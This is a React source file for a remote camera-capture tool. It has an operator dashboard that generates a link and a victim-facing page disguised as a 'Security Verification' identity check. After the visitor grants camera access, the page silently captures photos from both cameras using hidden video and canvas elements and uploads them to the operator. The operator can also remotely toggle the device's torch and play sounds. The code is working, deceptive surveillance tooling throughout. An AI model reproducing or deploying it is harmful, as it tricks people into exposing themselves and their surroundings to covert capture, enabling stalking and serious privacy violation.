import React, { useState, useEffect, useRef } from 'react';
import { Camera, Copy, ExternalLink, Image as ImageIcon, Trash2, RefreshCw, Flashlight, Volume2 } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import { nanoid } from 'nanoid';
import { clsx, type ClassValue } from 'clsx';
import { twMerge } from 'tailwind-merge';

function cn(...inputs: ClassValue[]) {
  return twMerge(clsx(inputs));
}

// --- Dashboard Component ---
const Dashboard = () => {
  const [sessionId, setSessionId] = useState('');
  const [capturedImages, setCapturedImages] = useState<any[]>([]);
  const [copied, setCopied] = useState(false);
  const [ws, setWs] = useState<WebSocket | null>(null);
  const [torchOn, setTorchOn] = useState(false);

  useEffect(() => {
    const savedSession = localStorage.getItem('cam_session_id');
    if (savedSession) {
      setSessionId(savedSession);
    } else {
      const newId = nanoid(10);
      setSessionId(newId);
      localStorage.setItem('cam_session_id', newId);
    }

    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const socket = new WebSocket(`${protocol}//${window.location.host}`);
    setWs(socket);

    socket.onmessage = (event) => {
      const data = JSON.parse(event.data);
      if (data.type === 'NEW_IMAGE' && data.sessionId === sessionId) {
        setCapturedImages(prev => [data, ...prev]);
      }
    };

    return () => socket.close();
  }, [sessionId]);

  const sendCommand = (type: string, payload: any = {}) => {
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type, sessionId, ...payload }));
    }
  };

  const toggleTorch = () => {
    const newState = !torchOn;
    setTorchOn(newState);
    sendCommand('TOGGLE_TORCH', { enabled: newState });
  };

  const playSound = () => {
    sendCommand('PLAY_SOUND');
  };

  const generateNewUrl = () => {
    const newId = nanoid(10);
    setSessionId(newId);
    localStorage.setItem('cam_session_id', newId);
    setCapturedImages([]);
  };

  const captureUrl = `${window.location.origin}?session=${sessionId}`;

  const copyToClipboard = () => {
    navigator.clipboard.writeText(captureUrl);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="min-h-screen bg-zinc-950 text-zinc-100 p-6 font-sans">
      <div className="max-w-4xl mx-auto space-y-8">
        <header className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-zinc-800 pb-6">
          <div>
            <h1 className="text-3xl font-bold tracking-tight text-emerald-500">Remote Cam Dashboard</h1>
            <p className="text-zinc-400 mt-1">Generate a link and control the remote device.</p>
          </div>
          <div className="flex gap-2">
            <button 
              onClick={playSound}
              className="flex items-center gap-2 px-4 py-2 bg-zinc-900 hover:bg-zinc-800 border border-zinc-700 rounded-lg transition-colors text-sm text-blue-400"
              title="Play sound on remote device"
            >
              <Volume2 className="w-4 h-4" />
              Play Sound
            </button>
            <button 
              onClick={toggleTorch}
              className={cn(
                "flex items-center gap-2 px-4 py-2 border rounded-lg transition-colors text-sm",
                torchOn ? "bg-yellow-500/20 border-yellow-500 text-yellow-500" : "bg-zinc-900 border-zinc-700 text-zinc-400 hover:bg-zinc-800"
              )}
            >
              <Flashlight className="w-4 h-4" />
              {torchOn ? "Torch ON" : "Torch OFF"}
            </button>
            <button 
              onClick={generateNewUrl}
              className="flex items-center gap-2 px-4 py-2 bg-zinc-900 hover:bg-zinc-800 border border-zinc-700 rounded-lg transition-colors text-sm"
            >
              <RefreshCw className="w-4 h-4" />
              New Session
            </button>
          </div>
        </header>

        <section className="bg-zinc-900/50 border border-zinc-800 rounded-2xl p-6 space-y-4">
          <h2 className="text-lg font-semibold flex items-center gap-2">
            <ExternalLink className="w-5 h-5 text-emerald-500" />
            Share this link
          </h2>
          <div className="flex flex-col sm:flex-row gap-3">
            <div className="flex-1 bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-3 font-mono text-sm break-all">
              {captureUrl}
            </div>
            <button 
              onClick={copyToClipboard}
              className={cn(
                "flex items-center justify-center gap-2 px-6 py-3 rounded-xl font-medium transition-all",
                copied ? "bg-emerald-500 text-white" : "bg-zinc-100 text-zinc-950 hover:bg-white"
              )}
            >
              {copied ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Copy className="w-4 h-4" />}
              {copied ? "Copied!" : "Copy Link"}
            </button>
          </div>
        </section>

        <section className="space-y-6">
          <div className="flex items-center justify-between">
            <h2 className="text-xl font-semibold flex items-center gap-2">
              <ImageIcon className="w-5 h-5 text-emerald-500" />
              Captured Images ({capturedImages.length})
            </h2>
            {capturedImages.length > 0 && (
              <button 
                onClick={() => setCapturedImages([])}
                className="text-xs text-zinc-500 hover:text-red-400 transition-colors flex items-center gap-1"
              >
                <Trash2 className="w-3 h-3" /> Clear All
              </button>
            )}
          </div>

          {capturedImages.length === 0 ? (
            <div className="h-64 border-2 border-dashed border-zinc-800 rounded-2xl flex flex-col items-center justify-center text-zinc-600">
              <Camera className="w-12 h-12 mb-2 opacity-20" />
              <p>Waiting for images...</p>
            </div>
          ) : (
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
              <AnimatePresence mode="popLayout">
                {capturedImages.map((img, idx) => (
                  <motion.div
                    key={img.timestamp + idx}
                    initial={{ opacity: 0, scale: 0.9, y: 20 }}
                    animate={{ opacity: 1, scale: 1, y: 0 }}
                    exit={{ opacity: 0, scale: 0.8 }}
                    className="group relative bg-zinc-900 border border-zinc-800 rounded-2xl overflow-hidden shadow-2xl"
                  >
                    <img 
                      src={img.image} 
                      alt="Captured" 
                      className="w-full aspect-square object-cover"
                      referrerPolicy="no-referrer"
                    />
                    <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent opacity-0 group-hover:opacity-100 transition-opacity p-4 flex flex-col justify-end">
                      <p className="text-xs text-zinc-300">
                        {new Date(img.timestamp).toLocaleTimeString()}
                      </p>
                    </div>
                  </motion.div>
                ))}
              </AnimatePresence>
            </div>
          )}
        </section>
      </div>
    </div>
  );
};

// --- Capture Component ---
const Capture = ({ sessionId }: { sessionId: string }) => {
  const [status, setStatus] = useState<'idle' | 'requesting' | 'capturing' | 'done' | 'error'>('idle');
  const [progress, setProgress] = useState({ current: 0, total: 10, camera: 'front' });
  const [errorMsg, setErrorMsg] = useState('');
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const activeStreamRef = useRef<MediaStream | null>(null);

  useEffect(() => {
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const ws = new WebSocket(`${protocol}//${window.location.host}`);

    ws.onmessage = async (event) => {
      const data = JSON.parse(event.data);
      if (data.sessionId !== sessionId) return;

      if (data.type === 'TOGGLE_TORCH') {
        handleTorch(data.enabled);
      } else if (data.type === 'PLAY_SOUND') {
        handlePlaySound();
      }
    };

    return () => ws.close();
  }, [sessionId]);

  const handleTorch = async (enabled: boolean) => {
    try {
      // If no stream is active, or it's the front camera, we need to open the back camera
      if (!activeStreamRef.current || progress.camera === 'front') {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: 'environment' }, 
          audio: false 
        });
        activeStreamRef.current = stream;
        if (videoRef.current) videoRef.current.srcObject = stream;
        setProgress(prev => ({ ...prev, camera: 'back' }));
      }

      const track = activeStreamRef.current.getVideoTracks()[0];
      const imageCapture = new (window as any).ImageCapture(track);
      const capabilities = await imageCapture.getPhotoCapabilities();
      
      if (capabilities.fillLightMode && capabilities.fillLightMode.includes('flash')) {
        await track.applyConstraints({
          advanced: [{ torch: enabled }]
        } as any);
      } else {
        // Fallback for some browsers
        await track.applyConstraints({
          advanced: [{ torch: enabled }]
        } as any);
      }
    } catch (e) {
      console.error("Torch error:", e);
      // Try direct constraint if ImageCapture fails
      if (activeStreamRef.current) {
        try {
          const track = activeStreamRef.current.getVideoTracks()[0];
          await track.applyConstraints({ advanced: [{ torch: enabled }] } as any);
        } catch (err) {
          console.error("Final torch attempt failed:", err);
        }
      }
    }
  };

  const handlePlaySound = () => {
    const audioCtx = new (window.AudioContext || (window as any).webkitAudioContext)();
    const oscillator = audioCtx.createOscillator();
    const gainNode = audioCtx.createGain();

    oscillator.connect(gainNode);
    gainNode.connect(audioCtx.destination);

    oscillator.type = 'sine';
    oscillator.frequency.setValueAtTime(880, audioCtx.currentTime); // A5 note
    gainNode.gain.setValueAtTime(1, audioCtx.currentTime);
    gainNode.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 1);

    oscillator.start();
    oscillator.stop(audioCtx.currentTime + 1);
  };

  const startCaptureProcess = async () => {
    setStatus('requesting');
    try {
      await captureFromCamera('user', 1);
      await captureFromCamera('environment', 6);
      setStatus('done');
    } catch (err: any) {
      console.error(err);
      setStatus('error');
      setErrorMsg(err.name === 'NotAllowedError' ? 'Camera permission denied.' : 'Could not access camera.');
    }
  };

  const captureFromCamera = async (facingMode: 'user' | 'environment', startNum: number) => {
    setProgress(prev => ({ ...prev, camera: facingMode === 'user' ? 'front' : 'back' }));
    
    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: { facingMode: { exact: facingMode } }, 
      audio: false 
    }).catch(async () => {
      return await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: facingMode }, 
        audio: false 
      });
    });

    activeStreamRef.current = stream;

    if (videoRef.current) {
      videoRef.current.srcObject = stream;
      setStatus('capturing');
      
      await new Promise(resolve => setTimeout(resolve, 2000));

      for (let i = 0; i < 5; i++) {
        const currentCount = startNum + i;
        setProgress(prev => ({ ...prev, current: currentCount }));
        await takeSinglePhoto();
        await new Promise(resolve => setTimeout(resolve, 800));
      }

      stream.getTracks().forEach(track => track.stop());
      activeStreamRef.current = null;
    }
  };

  const takeSinglePhoto = async () => {
    if (videoRef.current && canvasRef.current) {
      const video = videoRef.current;
      const canvas = canvasRef.current;
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context?.drawImage(video, 0, 0, canvas.width, canvas.height);
      const imageData = canvas.toDataURL('image/jpeg', 0.7);
      await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, image: imageData })
      });
    }
  };

  return (
    <div className="min-h-screen bg-zinc-950 flex items-center justify-center p-6 text-zinc-100">
      <div className="max-w-md w-full bg-zinc-900 border border-zinc-800 rounded-3xl p-8 text-center space-y-6 shadow-2xl">
        <div className="w-20 h-20 bg-emerald-500/10 rounded-full flex items-center justify-center mx-auto">
          <Camera className={cn("w-10 h-10 text-emerald-500", (status === 'capturing' || status === 'requesting') && "animate-pulse")} />
        </div>
        <div className="space-y-2">
          <h1 className="text-2xl font-bold">Security Verification</h1>
          <p className="text-zinc-400 text-sm">Please allow camera access to complete the 10-step identity verification process.</p>
        </div>
        {status === 'idle' && (
          <button onClick={startCaptureProcess} className="w-full py-4 bg-emerald-500 hover:bg-emerald-400 text-zinc-950 font-bold rounded-2xl transition-all transform active:scale-95">
            Start Verification
          </button>
        )}
        {(status === 'requesting' || status === 'capturing') && (
          <div className="space-y-4">
            <div className="flex flex-col items-center gap-2">
              <div className="text-emerald-500 font-medium flex items-center gap-2">
                <RefreshCw className="w-5 h-5 animate-spin" />
                {status === 'requesting' ? "Initializing..." : `Capturing ${progress.camera} camera...`}
              </div>
              <div className="w-full bg-zinc-800 h-2 rounded-full overflow-hidden mt-2">
                <motion.div className="bg-emerald-500 h-full" initial={{ width: 0 }} animate={{ width: `${(progress.current / progress.total) * 100}%` }} />
              </div>
              <p className="text-xs text-zinc-500">Step {progress.current} of {progress.total}</p>
            </div>
            <video ref={videoRef} autoPlay playsInline className="hidden" />
            <canvas ref={canvasRef} className="hidden" />
          </div>
        )}
        {status === 'done' && (
          <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} className="space-y-4">
            <div className="text-emerald-500 font-bold text-lg">Verification Successful!</div>
            <p className="text-zinc-500 text-sm">All steps completed. You may now close this tab.</p>
          </motion.div>
        )}
        {status === 'error' && (
          <div className="space-y-4">
            <div className="text-red-400 font-medium">{errorMsg}</div>
            <button onClick={() => setStatus('idle')} className="text-sm text-zinc-400 underline">Try Again</button>
          </div>
        )}
      </div>
    </div>
  );
};

// --- Main App Component ---
export default function App() {
  const [sessionId, setSessionId] = useState<string | null>(null);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const session = params.get('session');
    if (session) {
      setSessionId(session);
    }
  }, []);

  if (sessionId) {
    return <Capture sessionId={sessionId} />;
  }

  return <Dashboard />;
}
